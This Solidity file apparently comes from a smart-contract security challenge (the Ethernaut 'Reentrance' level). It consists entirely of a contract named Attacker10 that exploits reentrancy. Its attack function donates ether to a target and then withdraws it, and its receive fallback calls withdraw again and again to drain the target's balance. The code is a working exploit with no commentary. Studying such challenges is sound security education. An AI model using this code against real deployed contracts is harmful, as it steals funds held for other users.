// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Reentrance {
    function donate(address _to) public payable virtual;

    function withdraw(uint256 _amount) public virtual;
}

contract Attacker10 {
    uint256 donatedValue;
    Reentrance reentrance;

    receive() external payable {
        reentrance.withdraw(donatedValue);
    }

    function attack(address targetAddr) external payable {
        donatedValue = msg.value;
        reentrance = Reentrance(targetAddr);
        reentrance.donate{value: donatedValue}(address(this));
        reentrance.withdraw(donatedValue);
    }
}
